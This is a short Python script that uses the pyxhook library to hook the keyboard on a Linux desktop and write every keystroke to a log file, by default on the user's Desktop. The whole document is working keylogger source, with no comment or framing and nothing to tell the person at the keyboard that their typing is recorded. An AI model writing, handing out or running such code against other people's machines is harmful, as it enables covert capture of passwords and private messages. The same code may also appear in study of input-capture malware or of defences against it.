#!/usr/bin/python3

import os
import pyxhook

log_file = os.environ.get(
	'zero-key-score',
	os.path.expanduser('~/Desktop/file.log')
)

def OnKeyPress(event):
	with open(log_file, 'a') as f:
		f.write('{}\n'.format(event.Key))


hook = pyxhook.HookManager()
hook.KeyDown = OnKeyPress
hook.HookKeyboard()

try:
	hook.start()
except Exception as e:
	msg = 'Error while catching events:\n {}'.format(e)
	with open(log_file, 'a') as f:
		f.write('{}\n'.format(msg))
